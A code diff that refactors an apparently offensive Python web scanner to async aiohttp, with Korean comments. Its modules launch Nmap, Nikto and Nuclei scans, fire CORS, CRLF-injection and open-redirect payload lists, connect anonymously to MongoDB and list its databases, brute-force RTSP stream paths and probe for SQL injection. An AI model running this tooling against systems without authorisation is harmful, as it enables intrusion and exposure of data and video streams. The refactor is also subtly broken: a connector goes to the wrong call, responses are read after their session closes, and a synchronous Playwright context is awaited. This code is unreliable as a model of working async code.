@@ -1,7 +1,7 @@
 import os
 import sys
 import socket
-import requests
+import inspect
 import threading
 import time
 import base64
@@ -23,9 +23,11 @@ import html
 import configparser
 import google.genai as genai
 import urllib3
+import aiohttp
+import asyncio
 from tqdm import tqdm
 
-
+import urllib3 # Ensure urllib3 is imported before use
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # =================================================================================
@@ -986,10 +988,10 @@ def get_encoded_payloads(payload):
         pass
     return list(encoded_payloads)
 
-def _send_http_request(url, method='GET', data=None, headers=None, cookies=None, timeout=10, verify_ssl=False, allow_redirects=True, output=None, session_cookies=None):
-    """향상된 HTTP 요청 함수 (세션 쿠키, 쓰로틀링, 헤더 랜덤화)"""
+async def _send_async_http_request(url, method='GET', data=None, headers=None, cookies=None, timeout=10, verify_ssl=False, allow_redirects=True, output=None, session_cookies=None):
+    """향상된 비동기 HTTP 요청 함수 (세션 쿠키, 쓰로틀링, 헤더 랜덤화)"""
     # 요청 간 랜덤 지연 (쓰로틀링)
-    time.sleep(random.uniform(0.01, 0.05))
+    await asyncio.sleep(random.uniform(0.01, 0.05))
 
     req_headers = {
         'User-Agent': random.choice([
@@ -1010,14 +1012,12 @@ def _send_http_request(url, method='GET', data=None, headers=None, cookies=None,
     if session_cookies:
         req_cookies.update(session_cookies)
 
-    session = requests.Session()
-    session.verify = verify_ssl
-    session.allow_redirects = allow_redirects
-    session.cookies.update(req_cookies)
-
-    if PROXY_LIST:
-        proxy = random.choice(PROXY_LIST)
-        session.proxies = {'http': proxy, 'https': proxy}
+    # aiohttp는 requests와 다른 방식으로 쿠키를 처리합니다.
+    # ClientSession에 직접 쿠키를 전달하거나, Headers에 'Cookie'를 추가합니다.
+    # 여기서는 ClientSession에 직접 전달하는 방식을 사용합니다.
+    aiohttp_cookies = {}
+    for k, v in req_cookies.items():
+        aiohttp_cookies[k] = v
 
     request_details = {
         'url': url,
@@ -1033,21 +1033,30 @@ def _send_http_request(url, method='GET', data=None, headers=None, cookies=None,
     }
 
     try:
-        res = session.request(method, url, data=data, headers=req_headers, timeout=timeout)
-        response_details['status_code'] = res.status_code
-        response_details['headers'] = dict(res.headers)
-        response_details['text'] = res.text
-        return res, request_details, response_details
-    except requests.exceptions.Timeout:
+        async with aiohttp.ClientSession(cookies=aiohttp_cookies) as session:
+            # aiohttp는 verify_ssl을 connector_args로 받습니다.
+            connector = aiohttp.TCPConnector(ssl=False) if not verify_ssl else None
+            
+            # aiohttp는 allow_redirects를 request 메서드의 인자로 받습니다.
+            async with session.request(method, url, data=data, headers=req_headers, timeout=timeout, allow_redirects=allow_redirects, connector=connector) as res:
+                response_details['status_code'] = res.status
+                response_details['headers'] = dict(res.headers)
+                response_details['text'] = await res.text()
+                return res, request_details, response_details
+    except asyncio.TimeoutError:
         error_msg = f"Request to {url} timed out."
         if output: output.print(f"    [ERROR] {error_msg}")
         response_details['error'] = error_msg
-    except requests.exceptions.ConnectionError as e:
+    except aiohttp.ClientConnectionError as e:
         error_msg = f"Connection error to {url}: {e}"
         if output: output.print(f"    [ERROR] {error_msg}")
         response_details['error'] = error_msg
-    except requests.exceptions.RequestException as e:
-        error_msg = f"Unexpected request error for {url}: {e}"
+    except aiohttp.ClientError as e:
+        error_msg = f"Unexpected aiohttp client error for {url}: {e}"
+        if output: output.print(f"    [ERROR] {error_msg}")
+        response_details['error'] = error_msg
+    except Exception as e:
+        error_msg = f"An unexpected error occurred during HTTP request to {url}: {e}"
         if output: output.print(f"    [ERROR] {error_msg}")
         response_details['error'] = error_msg
     return None, request_details, response_details
@@ -1072,7 +1081,7 @@ def _get_forms(html_content, base_url):
     return forms
 
 # --- 1. 지능형 스파이더 (Advanced Spider) ---
-def spider_target(base_url, output, session_cookies=None):
+async def spider_target(base_url, output, session_cookies=None):
     output.print("\n[+] Starting Advanced Spider with JavaScript Rendering (using Playwright)...")
     discovered_urls = set()
     discovered_forms = []
@@ -1080,19 +1089,19 @@ def spider_target(base_url, output, session_cookies=None):
     # 1. JS 렌더링을 통한 수집 (Playwright)
     try:
         with sync_playwright() as p:
-            browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
-            context = browser.new_context(ignore_https_errors=True)
+            browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
+            context = await browser.new_context(ignore_https_errors=True)
             if session_cookies:
                 # Format cookies for Playwright
                 pw_cookies = [{'name': k, 'value': v, 'domain': get_domain(base_url), 'path': '/'} for k, v in session_cookies.items()]
-                context.add_cookies(pw_cookies)
+                await context.add_cookies(pw_cookies)
             
-            page = context.new_page()
+            page = await context.new_page()
             # Increase timeout and use 'networkidle' for better results on heavy sites
-            page.goto(base_url, wait_until='networkidle', timeout=30000)
+            await page.goto(base_url, wait_until='networkidle', timeout=30000)
             
             # Extract all links from 'a' tags
-            links = page.eval_on_selector_all('a[href]', 'elements => elements.map(el => el.href)')
+            links = await page.eval_on_selector_all('a[href]', 'elements => elements.map(el => el.href)')
             for link in links:
                 # Ensure the link is absolute and within the same domain
                 full_url = urljoin(base_url, link)
@@ -1100,13 +1109,13 @@ def spider_target(base_url, output, session_cookies=None):
                     discovered_urls.add(full_url)
 
             # JS 렌더링 후 form 수집
-            html_content = page.content()
+            html_content = await page.content()
             forms_from_js = _get_forms(html_content, base_url)
             for form in forms_from_js:
                 if form not in discovered_forms:
                     discovered_forms.append(form)
             
-            browser.close()
+            await browser.close()
             output.print(f"  [INFO] Playwright spider found {len(discovered_urls)} URLs and {len(discovered_forms)} forms from dynamic content.")
 
     except Exception as e:
@@ -1114,22 +1123,22 @@ def spider_target(base_url, output, session_cookies=None):
 
     # 2. JS 렌더링 실패 시 또는 추가 수집을 위한 정적 분석 (Fallback)
     try:
-        res, request_details, response_details = _send_http_request(base_url, output=output, session_cookies=session_cookies)
+        res, request_details, response_details = await _send_async_http_request(base_url, output=output, session_cookies=session_cookies)
         if res:
-            soup = BeautifulSoup(res.text, 'html.parser')
+            soup = BeautifulSoup(await res.text(), 'html.parser')
             for link in soup.find_all('a', href=True):
                 full_url = urljoin(base_url, link['href'])
                 if get_domain(full_url) == get_domain(base_url):
                      discovered_urls.add(full_url)
             
-            static_forms = _get_forms(res.text, base_url)
+            static_forms = _get_forms(await res.text(), base_url)
             for form in static_forms:
                 if form not in discovered_forms:
                     discovered_forms.append(form)
             
             # NEW: Regex for hidden URLs in JS/comments
             output.print("  [INFO] Searching for hidden URLs with regex in static content...")
-            regex_urls = re.findall(r'[\'"](/[^/][^\'"\s,]+|http[s]?://[^\'"\s,]+)[\'"]', res.text)
+            regex_urls = re.findall(r'[\'"](/[^/][^\'"\s,]+|http[s]?://[^\'"\s,]+)[\'"]', await res.text())
             for url in regex_urls:
                 full_url = urljoin(base_url, url)
                 if get_domain(full_url) == get_domain(base_url): # Stay on target domain
@@ -1142,15 +1151,16 @@ def spider_target(base_url, output, session_cookies=None):
     # 3. robots.txt 및 sitemap.xml 파싱
     for path in ['/robots.txt', '/sitemap.xml']:
         try:
-            res, request_details, response_details = _send_http_request(urljoin(base_url, path), output=output, session_cookies=session_cookies)
-            if res and res.status_code == 200:
+            res, request_details, response_details = await _send_async_http_request(urljoin(base_url, path), output=output, session_cookies=session_cookies)
+            if res and res.status == 200:
                 output.print(f"  [INFO] Parsing {path}...")
+                text_content = await res.text()
                 if 'robots.txt' in path:
-                    paths = re.findall(r'(?:Disallow|Allow):\s*(/.*)', res.text)
+                    paths = re.findall(r'(?:Disallow|Allow):\s*(/.*)', text_content)
                     for p in paths:
                         discovered_urls.add(urljoin(base_url, p.strip()))
                 elif 'sitemap.xml' in path:
-                    locs = re.findall(r'<loc>(.*?)</loc>', res.text)
+                    locs = re.findall(r'<loc>(.*?)</loc>', text_content)
                     for loc in locs:
                         discovered_urls.add(loc.strip())
         except Exception as e:
@@ -1174,7 +1184,7 @@ def spider_target(base_url, output, session_cookies=None):
     output.print(f"  [INFO] Spider finished. Discovered {len(discovered_urls)} total resources and {len(discovered_forms)} forms.")
     return list(discovered_urls), discovered_forms
 
-def scan_nmap(target, output, tech, report, session_cookies=None):
+async def scan_nmap(target, output, tech, report, session_cookies=None):
     output.print(f"\n[+] Starting Nmap Scan on {target}...")
     domain = get_domain(normalize_target(target))
     try:
@@ -1186,68 +1196,102 @@ def scan_nmap(target, output, tech, report, session_cookies=None):
     nmap_command = ["nmap", "-sV", "-O", "-p-", "--script", "vuln", target_ip]
     
     try:
-        nmap_output = subprocess.run(nmap_command, capture_output=True, text=True, check=True, timeout=1800)
+        process = await asyncio.create_subprocess_exec(
+            *nmap_command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=1800)
+        nmap_output = stdout.decode(errors='ignore')
+        nmap_error = stderr.decode(errors='ignore')
         
-        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s+(.*)", nmap_output.stdout)
-        os_match = re.search(r"OS details: ([^\n]+)", nmap_output.stdout)
+        if process.returncode != 0:
+            output.print(f"  [ERROR] Nmap command failed with exit code {process.returncode}: {nmap_error}")
+            return
+
+        if "0 hosts up" in nmap_output:
+            output.print("  [INFO] Nmap reported '0 hosts up', indicating the target may be down or blocking scans.")
+            return
+
+        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s+(.*)", nmap_output)
+        os_match = re.search(r"OS details: ([^\n]+)|Running: ([^\n]+)", nmap_output)
         
         if os_match:
-            tech['os'] = os_match.group(1).strip()
+            os_details = os_match.group(1) or os_match.group(2)
+            tech['os'] = os_details.strip()
             output.print(f"  [INFO] Detected OS: {tech['os']}")
         
         if open_ports:
             output.print(f"  [INFO] Open Ports and Services:")
             for port, service, version in open_ports:
                 output.print(f"    - Port {port}: {service} ({version})")
-                report.add_finding("Open Port/Service", "Info", f"{target}:{port}", "Port", port,
-                                   f"Port {port} is open and running {service} ({version}).",
-                                   "Ensure all open ports are necessary and services are properly secured. Close unnecessary ports.",
-                                   f"Nmap detected port {port} running {service} version {version}.")
+                # Only create findings for interesting ports to reduce noise
+                interesting_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 5432, 5900, 8080, 8443, 27017]
+                if int(port) in interesting_ports:
+                    report.add_finding("Open Port/Service", "Info", f"{target}:{port}", "Port", port,
+                                       f"Port {port} is open and running {service} ({version}). This is an interesting port that warrants further investigation.",
+                                       "Ensure all open ports are necessary and services are properly secured. Close unnecessary ports if they are not required.",
+                                       f"Nmap detected port {port} running {service} version {version}.")
         else:
             output.print("  [INFO] No open ports detected by Nmap.")
             
-    except subprocess.CalledProcessError as e:
-        output.print(f"  [ERROR] Nmap command failed: {e.stderr}")
-    except subprocess.TimeoutExpired:
-        output.print(f"  [ERROR] Nmap command timed out after 10 minutes.")
+    except asyncio.TimeoutError:
+        output.print(f"  [ERROR] Nmap command timed out after 30 minutes.")
     except FileNotFoundError:
         output.print(f"  [ERROR] Nmap not found. Please ensure Nmap is installed and in your PATH.")
     except Exception as e:
         output.print(f"  [ERROR] An unexpected error occurred during Nmap scan: {e}")
 
 # --- 신규 공격 모듈들 ---
-def scan_nikto(target, output, tech, report, session_cookies=None):
+async def scan_nikto(target, output, tech, report, session_cookies=None):
     output.print(f"\n[+] Starting Nikto Scan on {target}...")
     target_url = normalize_target(target)
     
     nikto_command = ["nikto", "-h", target_url, "-Tuning", "1,2,3,4,5,x"]
     
     try:
-        nikto_output = subprocess.run(nikto_command, capture_output=True, text=True, timeout=1800)
+        process = await asyncio.create_subprocess_exec(
+            *nikto_command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=1800)
+        nikto_output = stdout.decode(errors='ignore')
+        nikto_error = stderr.decode(errors='ignore')
+
+        if process.returncode != 0 and "0 host(s) tested" not in nikto_output:
+            output.print(f"  [ERROR] Nikto command failed with exit code {process.returncode}: {nikto_error}")
+            return
+
+        # Check for common Nikto failure indicator
+        if "0 host(s) tested" in nikto_output:
+            output.print("  [INFO] Nikto reported '0 host(s) tested', indicating the scan may have failed or the target was unreachable by Nikto.")
+            return
         
-        vulnerability_matches = re.findall(r"\+ (.*)", nikto_output.stdout)
+        vulnerability_matches = re.findall(r"\+ (.*)", nikto_output)
         
         if vulnerability_matches:
             output.print(f"  [INFO] Nikto found potential vulnerabilities:")
             for vuln in vulnerability_matches:
-                output.print(f"    - {vuln.strip()}")
-                report.add_finding("Web Server Vulnerability (Nikto)", "Medium", target_url, "N/A", "N/A",
-                                   f"Nikto identified a potential web server vulnerability: {vuln.strip()}",
-                                   "Review Nikto's findings and apply appropriate patches or configuration changes.",
-                                   f"Nikto output: {vuln.strip()}")
+                vuln_text = vuln.strip()
+                # Filter out informational, non-vulnerability lines
+                if "retrieved" not in vuln_text.lower() and "allowed http methods" not in vuln_text.lower():
+                    output.print(f"    - {vuln_text}")
+                    report.add_finding("Web Server Vulnerability (Nikto)", "Medium", target_url, "N/A", "N/A",
+                                       f"Nikto identified a potential web server vulnerability: {vuln_text}",
+                                       "Review Nikto's findings and apply appropriate patches or configuration changes.",
+                                       f"Nikto output: {vuln_text}")
         else:
             output.print("  [INFO] Nikto found no obvious vulnerabilities.")
             
-    except subprocess.CalledProcessError as e:
-        output.print(f"  [ERROR] Nikto command failed: {e.stderr}")
-    except subprocess.TimeoutExpired:
-        output.print(f"  [ERROR] Nikto command timed out after 10 minutes.")
+    except asyncio.TimeoutError:
+        output.print(f"  [ERROR] Nikto command timed out after 30 minutes.")
     except FileNotFoundError:
         output.print(f"  [ERROR] Nikto not found. Please ensure Nikto is installed and in your PATH.")
     except Exception as e:
         output.print(f"  [ERROR] An unexpected error occurred during Nikto scan: {e}")
 
-def scan_nuclei(target, output, tech, report, session_cookies=None):
+async def scan_nuclei(target, output, tech, report, session_cookies=None):
     output.print(f"\n[+] Starting Enhanced Nuclei Scan on {target}...")
     target_url = normalize_target(target)
     
@@ -1258,10 +1302,21 @@ def scan_nuclei(target, output, tech, report, session_cookies=None):
     ]
     
     try:
-        nuclei_output = subprocess.run(nuclei_command, capture_output=True, text=True, timeout=1800)
+        process = await asyncio.create_subprocess_exec(
+            *nuclei_command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=1800)
+        nuclei_output = stdout.decode(errors='ignore')
+        nuclei_error = stderr.decode(errors='ignore')
+
+        if process.returncode != 0:
+            output.print(f"  [ERROR] Nuclei command failed with exit code {process.returncode}: {nuclei_error}")
+            return
         
         found_vulns = False
-        for line in nuclei_output.stdout.splitlines():
+        for line in nuclei_output.splitlines():
             try:
                 result = json.loads(line)
                 if result.get('info', {}).get('severity') and result.get('info', {}).get('name'):
@@ -1283,16 +1338,14 @@ def scan_nuclei(target, output, tech, report, session_cookies=None):
         if not found_vulns:
             output.print("  [INFO] Nuclei found no obvious vulnerabilities with the enhanced template set.")
             
-    except subprocess.CalledProcessError as e:
-        output.print(f"  [ERROR] Nuclei command failed: {e.stderr}")
-    except subprocess.TimeoutExpired:
+    except asyncio.TimeoutError:
         output.print(f"  [ERROR] Nuclei command timed out after 15 minutes.")
     except FileNotFoundError:
         output.print(f"  [ERROR] Nuclei not found. Please ensure Nuclei is installed and in your PATH.")
     except Exception as e:
         output.print(f"  [ERROR] An unexpected error occurred during Nuclei scan: {e}")
 
-def check_cors(target, form_to_test, output, tech, report, session_cookies=None):
+async def check_cors(target, form_to_test, output, tech, report, session_cookies=None, fast_mode=False):
     output.print(f"\n[+] Starting Enhanced CORS Misconfiguration Scan...")
     
     # v7.0 - 500+ Test Origins
@@ -1300,7 +1353,7 @@ def check_cors(target, form_to_test, output, tech, report, session_cookies=None)
     base_domain = '.'.join(target_host.split('.')[-2:]) if '.' in target_host else target_host
 
     # List of malicious and testing origins
-    malicious_origins = [
+    all_malicious_origins = [
         "https://evil-site.com",
         "http://evil-site.com",
         "https://attacker.com",
@@ -1354,9 +1407,17 @@ def check_cors(target, form_to_test, output, tech, report, session_cookies=None)
         *[f"https://random-cors-test-{i}.attacker.com" for i in range(100)], # Another block of randoms
     ]
 
-    def test_cors(url, method, origin_to_test, data=None):
+    # Fast mode: Use a small subset of high-probability origins
+    if fast_mode:
+        malicious_origins = all_malicious_origins[:10] + [o for o in all_malicious_origins if "null" in o or "localhost" in o or "127.0.0.1" in o][:5]
+        malicious_origins = list(set(malicious_origins)) # Remove duplicates
+        output.print(f"  [INFO] Fast mode enabled. Testing with {len(malicious_origins)} high-probability CORS origins.")
+    else:
+        malicious_origins = all_malicious_origins
+
+    async def test_cors(url, method, origin_to_test, data=None):
         headers = {'Origin': origin_to_test}
-        res, request_details, response_details = _send_http_request(url, method=method, data=data, headers=headers, output=output, session_cookies=session_cookies)
+        res, request_details, response_details = await _send_async_http_request(url, method=method, data=data, headers=headers, output=output, session_cookies=session_cookies)
         
         if res and 'Access-Control-Allow-Origin' in res.headers:
             acao_header = res.headers['Access-Control-Allow-Origin']
@@ -1428,26 +1489,30 @@ def check_cors(target, form_to_test, output, tech, report, session_cookies=None)
     # 4. Execute attacks on gathered points with ALL malicious origins
     for point in attack_points:
         output.print(f"  [*] Testing CORS on target: {point['url']} with param '{point.get('param', 'N/A')}'")
+        tasks = []
         for mal_origin in malicious_origins:
             # If the point has a param name, apply origin as parameter value
             if point['param']:
-                # The _send_http_request does not apply URL-encoding to full URL, but to individual value,
+                # The _send_async_http_request does not apply URL-encoding to full URL, but to individual value,
                 # so we need to encode mal_origin if it's placed into a parameter.
                 payload_val = mal_origin if mal_origin == "null" else quote(mal_origin)
                 test_url, test_data = build_request(point['url'], point['method'], point['param'], payload_val, point['form_data'], point['original_query'])
-                if test_cors(test_url, point['method'], origin_to_test=mal_origin, data=test_data):
-                    return # Exit on first confirmed vulnerability
+                tasks.append(test_cors(test_url, point['method'], origin_to_test=mal_origin, data=test_data))
             # If no specific param, test the URL headers directly
-            elif test_cors(point['url'], point['method'], origin_to_test=mal_origin, data=point.get('form_data')):
+            else:
+                tasks.append(test_cors(point['url'], point['method'], origin_to_test=mal_origin, data=point.get('form_data')))
+        
+        for result in await asyncio.gather(*tasks):
+            if result:
                 return # Exit on first confirmed vulnerability
     
     output.print("  [INFO] No obvious CORS misconfigurations detected.")
 
-def check_crlf(target, form_to_test, output, tech, report, session_cookies=None):
+async def check_crlf(target, form_to_test, output, tech, report, session_cookies=None, fast_mode=False):
     output.print(f"\n[+] Starting Ultimate CRLF Injection Scan...")
     
     # v7.0 - 500+ Payloads
-    payloads = [
+    all_payloads = [
         # Basic CRLF
         "%0d%0aInjected-Header: True",
         "%0d%0aSet-Cookie:crlf_poc=true",
@@ -1526,7 +1591,15 @@ def check_crlf(target, form_to_test, output, tech, report, session_cookies=None)
         *[f"%0dX-Cr-Header-{i}: {get_random_string(5)}" for i in range(100)],
     ]
 
-    def test_crlf(url, method, param_name, original_value, form_data=None, original_query=None):
+    # Fast mode: Use a small subset of high-probability payloads
+    if fast_mode:
+        payloads = all_payloads[:10] + [p for p in all_payloads if "Set-Cookie" in p or "Location" in p][:5]
+        payloads = list(set(payloads)) # Remove duplicates
+        output.print(f"  [INFO] Fast mode enabled. Testing with {len(payloads)} high-probability CRLF payloads.")
+    else:
+        payloads = all_payloads
+
+    async def test_crlf(url, method, param_name, original_value, form_data=None, original_query=None):
         for p in payloads:
             # Use a unique marker for this specific payload test
             marker_header = "Injected-Header"
@@ -1535,7 +1608,7 @@ def check_crlf(target, form_to_test, output, tech, report, session_cookies=None)
                 p = p.replace("True", marker_value)
             
             test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-            res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies, allow_redirects=False)
+            res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies, allow_redirects=False)
             
             if res and (res.headers.get(marker_header) == marker_value or "crlf_poc=true" in res.headers.get("Set-Cookie", "")):
                 output.print(f"  [HIGH] CRLF Injection confirmed in {method.upper()} param '{param_name}' with payload: {p}")
@@ -1582,10 +1655,10 @@ def check_crlf(target, form_to_test, output, tech, report, session_cookies=None)
     # 4. Execute attacks
     for point in attack_points:
         output.print(f"  [*] Testing CRLF on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        if test_crlf(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
+        if await test_crlf(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
             return
 
-def check_open_redirect(target, form_to_test, output, tech, report, session_cookies=None):
+async def check_open_redirect(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
     output.print(f"\n[+] Starting Enhanced Open Redirect Scan...")
     
     # v7.0 - 500+ Payloads
@@ -1645,12 +1718,12 @@ def check_open_redirect(target, form_to_test, output, tech, report, session_cook
         *['http://evil-redirect.com/' + ('%00' * i) for i in range(1, 50)],
     ]
 
-    def test_redirect(url, method, param_name, original_value, form_data=None, original_query=None):
+    async def test_redirect(url, method, param_name, original_value, form_data=None, original_query=None):
         for payload in redirect_payloads:
             test_url, test_data = build_request(url, method, param_name, payload, form_data, original_query)
-            res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, allow_redirects=False, output=output, session_cookies=session_cookies)
+            res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, allow_redirects=False, output=output, session_cookies=session_cookies)
             
-            if res and res.status_code in [301, 302, 303, 307, 308] and 'Location' in res.headers:
+            if res and res.status in [301, 302, 303, 307, 308] and 'Location' in res.headers:
                 location_header = res.headers['Location']
                 # Check if the redirect location is one of our malicious payloads
                 if any(p in location_header for p in ['evil-redirect.com', 'google.com', 'bing.com', 'javascript:', 'data:', '127.0.0.1']):
@@ -1698,24 +1771,27 @@ def check_open_redirect(target, form_to_test, output, tech, report, session_cook
     # 4. Execute attacks
     for point in attack_points:
         output.print(f"  [*] Testing Open Redirect on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        if test_redirect(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
+        if await test_redirect(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
             return
 
 # --- 2. 대상 프로파일링 ---
-def profile_target(target, output, tech, report, session_cookies=None):
+async def profile_target(target, output, tech, report, session_cookies=None):
     pass
 
 # --- 3. MongoDB 스캔 및 공격 ---
-def scan_and_exploit_mongodb(target, output, tech, report, session_cookies=None):
+async def scan_and_exploit_mongodb(target, output, tech, report, session_cookies=None):
     output.print("\n[+] Starting MongoDB Scan & Exploit...")
     domain = get_domain(normalize_target(target))
     port = 27017
     output.print(f"  [*] Attempting to connect to MongoDB on {domain}:{port}...")
+    
+    loop = asyncio.get_event_loop()
     try:
-        client = pymongo.MongoClient(domain, port, serverSelectionTimeoutMS=5000)
-        client.server_info() # Triggers connection
+        # pymongo.MongoClient is synchronous, so run it in a separate thread
+        client = await loop.run_in_executor(None, lambda: pymongo.MongoClient(domain, port, serverSelectionTimeoutMS=5000))
+        await loop.run_in_executor(None, client.server_info) # Triggers connection
         output.print(f"  [HIGH] Anonymous connection to MongoDB at {domain}:{port} successful!")
-        db_list = client.list_database_names()
+        db_list = await loop.run_in_executor(None, client.list_database_names)
         evidence = f"Successfully connected to MongoDB at {domain}:{port} without authentication.\n"
         evidence += f"Available databases: {db_list}"
         output.print(f"    [SUCCESS] Found databases: {db_list}")
@@ -1723,7 +1799,7 @@ def scan_and_exploit_mongodb(target, output, tech, report, session_cookies=None)
                            "The MongoDB server allows anonymous connections, potentially exposing all database contents.",
                            "Enforce authentication on the MongoDB server. Bind to localhost if remote access is not required.",
                            evidence)
-        client.close()
+        await loop.run_in_executor(None, client.close)
     except pymongo.errors.ServerSelectionTimeoutError:
         output.print("  [INFO] MongoDB connection timed out. Server is likely not running or firewalled.")
     except pymongo.errors.ConnectionFailure as e:
@@ -1735,8 +1811,7 @@ def scan_and_exploit_mongodb(target, output, tech, report, session_cookies=None)
 def check_cve_2025_14847(target, output, tech, report, session_cookies=None):
     pass
 
-# --- 5. RTSP 스캔 및 공격 ---
-def scan_rtsp(target, output, tech, report, session_cookies=None):
+async def scan_rtsp(target, output, tech, report, session_cookies=None):
     output.print("\n[+] Starting RTSP Scan and Brute Force...")
     domain = get_domain(normalize_target(target))
     rtsp_ports = [554, 8554, 5554, 8080, 80, 88, 81, 555, 7070, 10554]
@@ -1877,65 +1952,65 @@ def scan_rtsp(target, output, tech, report, session_cookies=None):
 
     for port in rtsp_ports:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            result = sock.connect_ex((domain, port))
-            sock.close()
+            reader, writer = await asyncio.open_connection(domain, port)
+            writer.close()
+            await writer.wait_closed()
 
-            if result == 0:
-                output.print(f"  [INFO] Port {port} is open. Sending RTSP OPTIONS request...")
-                request_line = f"OPTIONS rtsp://{domain}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(3)
-                s.connect((domain, port))
-                s.send(request_line.encode())
-                response = s.recv(1024).decode()
-                s.close()
+            output.print(f"  [INFO] Port {port} is open. Sending RTSP OPTIONS request...")
+            request_line = f"OPTIONS rtsp://{domain}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+            reader_opt, writer_opt = await asyncio.open_connection(domain, port)
+            writer_opt.write(request_line.encode())
+            await writer_opt.drain()
+            response = await asyncio.wait_for(reader_opt.read(1024), timeout=3)
+            writer_opt.close()
+            await writer_opt.wait_closed()
 
-                if "RTSP/1.0 200 OK" in response:
-                    methods = re.search(r"Public:\s*([^\r\n]+)", response)
-                    methods_str = methods.group(1) if methods else "N/A"
-                    output.print(f"  [HIGH] RTSP server found at rtsp://{domain}:{port}. Supported methods: {methods_str}")
-                    report.add_finding("RTSP Service Detected", "Medium", f"rtsp://{domain}:{port}", "N/A", "N/A",
-                                       f"An RTSP server is running on port {port}. Supported methods: {methods_str}. This could expose video streams.",
-                                       "Ensure the RTSP stream requires authentication and is properly firewalled if not intended for public access.",
-                                       f"RTSP OPTIONS Response:\n{response}")
+            if "RTSP/1.0 200 OK" in response.decode():
+                methods = re.search(r"Public:\s*([^\r\n]+)", response.decode())
+                methods_str = methods.group(1) if methods else "N/A"
+                output.print(f"  [HIGH] RTSP server found at rtsp://{domain}:{port}. Supported methods: {methods_str}")
+                report.add_finding("RTSP Service Detected", "Medium", f"rtsp://{domain}:{port}", "N/A", "N/A",
+                                   f"An RTSP server is running on port {port}. Supported methods: {methods_str}. This could expose video streams.",
+                                   "Ensure the RTSP stream requires authentication and is properly firewalled if not intended for public access.",
+                                   f"RTSP OPTIONS Response:\n{response.decode()}")
 
-                    for path in common_paths:
-                        full_path = f"rtsp://{domain}:{port}{path}"
-                        req = f"DESCRIBE {full_path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
-                        s_brute = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s_brute.settimeout(3)
-                        s_brute.connect((domain, port))
-                        s_brute.send(req.encode())
-                        res_brute = s_brute.recv(1024).decode()
-                        s_brute.close()
-                        if "RTSP/1.0 200 OK" in res_brute and "Content-Type: application/sdp" in res_brute:
-                            output.print(f"    [CRITICAL] Found valid RTSP stream path: {full_path}")
-                            report.add_finding("RTSP Stream Path Found", "High", full_path, "N/A", "N/A",
-                                               f"A valid and likely unprotected RTSP stream was found at {full_path}.",
-                                               "Protect RTSP streams with strong credentials.",
-                                               f"RTSP DESCRIBE Response:\n{res_brute}")
-        except socket.timeout:
+                for path in common_paths:
+                    full_path = f"rtsp://{domain}:{port}{path}"
+                    req = f"DESCRIBE {full_path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
+                    reader_brute, writer_brute = await asyncio.open_connection(domain, port)
+                    writer_brute.write(req.encode())
+                    await writer_brute.drain()
+                    res_brute = await asyncio.wait_for(reader_brute.read(1024), timeout=3)
+                    writer_brute.close()
+                    await writer_brute.wait_closed()
+                    if "RTSP/1.0 200 OK" in res_brute.decode() and "Content-Type: application/sdp" in res_brute.decode():
+                        output.print(f"    [CRITICAL] Found valid RTSP stream path: {full_path}")
+                        report.add_finding("RTSP Stream Path Found", "High", full_path, "N/A", "N/A",
+                                           f"A valid and likely unprotected RTSP stream was found at {full_path}.",
+                                           "Protect RTSP streams with strong credentials.",
+                                           f"RTSP DESCRIBE Response:\n{res_brute.decode()}")
+        except asyncio.TimeoutError:
             output.print(f"  [INFO] RTSP check on port {port} timed out.")
+        except ConnectionRefusedError:
+            output.print(f"  [INFO] Connection to RTSP port {port} refused.")
         except Exception as e:
-            output.print(f"  [ERROR] RTSP check on port {port} failed: {e}")
+            output.print(f"  [ERROR] An unexpected error occurred during RTSP check on port {port}: {e}")
 
 # --- SQL Injection Helper Functions ---
-def _get_num_columns(url, method, param_name, original_value, form_data, original_query, output, session_cookies):
+async def _get_num_columns(url, method, param_name, original_value, form_data, original_query, output, session_cookies):
     """UNION 공격을 위한 컬럼 개수를 추측합니다."""
     output.print(f"    [SQLi] Probing for number of columns...")
     for i in range(1, 20): # 최대 20개 컬럼까지 시도
         payload = f"ORDER BY {i}--"
         test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-        res, _, _ = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200 and "Unknown column" not in res.text and "ORDER BY" not in res.text:
+        res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
